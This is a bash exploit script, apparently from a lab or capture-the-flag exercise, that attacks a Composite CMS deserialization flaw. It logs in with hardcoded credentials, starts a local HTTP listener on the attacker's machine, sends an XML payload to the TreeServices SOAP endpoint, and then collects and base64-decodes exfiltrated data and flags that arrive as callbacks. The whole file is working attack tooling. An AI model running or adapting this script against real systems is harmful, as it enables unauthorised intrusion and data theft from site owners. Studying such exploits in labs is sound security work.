#!/bin/bash
# Composite CMS Deserialization Exploit
# Usage: ./exploit.sh [decode]

WORKDIR="$(cd "$(dirname "$0")" && pwd)"
source "${WORKDIR}/config.sh"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

COOKIES="/tmp/cookies.txt"

# Decode exfiltrated data
decode_exfil() {
    echo -e "${YELLOW}[*] Decoding exfiltrated data from server.log...${NC}"
    if [ -f "${WORKDIR}/server.log" ]; then
        grep -oP '(data|flag)=\K[^& ]+' "${WORKDIR}/server.log" 2>/dev/null | while read -r data; do
            echo "---"
            echo "$data" | base64 -d 2>/dev/null || echo "$data"
        done
        echo "---"
    else
        echo "[-] server.log not found"
    fi
    exit 0
}

[ "$1" == "decode" ] && decode_exfil

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  Composite CMS Deserialization Exploit${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "Target:   ${TARGET}"
echo -e "Callback: ${LHOST}:${LPORT}"
echo ""

# Check setup
if [ ! -f "${WORKDIR}/www/payload.xml" ]; then
    echo -e "${RED}[-] Run ./setup.sh first!${NC}"
    exit 1
fi

# Step 1: Login
echo -e "${YELLOW}[1/4] Logging in...${NC}"
curl -sS --max-time 10 -c "$COOKIES" -b "$COOKIES" "http://${TARGET}/Composite/top.aspx" > /dev/null 2>&1 || true
curl -sS --max-time 10 -c "$COOKIES" -b "$COOKIES" -X POST "http://${TARGET}/Composite/Login.aspx" \
    -d "txtUsername=peter&txtPassword=C9HUZAQ6mht6Ax4r" > /dev/null 2>&1 || true
echo -e "${GREEN}[+] Login attempted, cookies saved to ${COOKIES}${NC}"

# Step 2: Kill old server, start new
echo -e "${YELLOW}[2/4] Starting HTTP server on port ${LPORT}...${NC}"
pkill -f "python3 -m http.server ${LPORT}" 2>/dev/null || true
sleep 1
cd "${WORKDIR}/www"
python3 -m http.server "$LPORT" > "${WORKDIR}/server.log" 2>&1 &
SERVER_PID=$!
cd - > /dev/null
sleep 2
echo -e "${GREEN}[+] Server started (PID: ${SERVER_PID})${NC}"

# Step 3: Send exploit
echo -e "${YELLOW}[3/4] Sending exploit payload...${NC}"
curl -s -X POST "http://${TARGET}/Composite/services/Tree/TreeServices.asmx" \
    -b "$COOKIES" \
    -H "Content-Type: text/xml; charset=utf-8" \
    -H "SOAPAction: \"http://www.composite.net/ns/management/GetMultipleChildren\"" \
    --max-time 120 \
    -d @"${WORKDIR}/www/payload.xml" &
CURL_PID=$!
echo -e "${GREEN}[+] Exploit sent (PID: ${CURL_PID})${NC}"

# Step 4: Monitor
echo ""
echo -e "${BLUE}[4/4] Monitoring for callbacks...${NC}"
echo -e "${YELLOW}Commands:${NC}"
echo "  tail -f ${WORKDIR}/server.log  # Watch live"
echo "  ./exploit.sh decode            # Decode exfil data"
echo "  pkill -f 'http.server ${LPORT}' # Stop server"
echo ""

# Wait a bit and show any callbacks
sleep 10
echo -e "${YELLOW}[*] Recent callbacks:${NC}"
cat "${WORKDIR}/server.log" 2>/dev/null | tail -20
